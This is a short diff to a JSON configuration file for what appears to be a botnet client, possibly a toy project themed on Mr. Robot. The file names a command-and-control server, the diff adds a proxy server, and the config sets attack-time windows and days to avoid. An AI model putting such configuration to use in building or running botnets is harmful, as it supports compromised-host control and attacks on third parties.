@@ -1,6 +1,7 @@
 {
     "last_modified" : 1478636841,
     "cc_server"     : "https://botnet.fsociety.com",
+    "proxy_server"  : "https://proxy.fsociety.com",
     "user_agent_b"  : "ELLIOT",
     "log_file"      : "./path/to/file.txt",
 
@@ -12,7 +13,7 @@
             "action_conditions" : {
                 "AM"  :  1,
                 "PM"  :  1,
-                "attack_time": "18-20", // or none
+                "attack_time": "18-20",
                 "avoid_week"  : [0, 2, 5],
                 "avoid_month" : [1, 3, 25]
             },
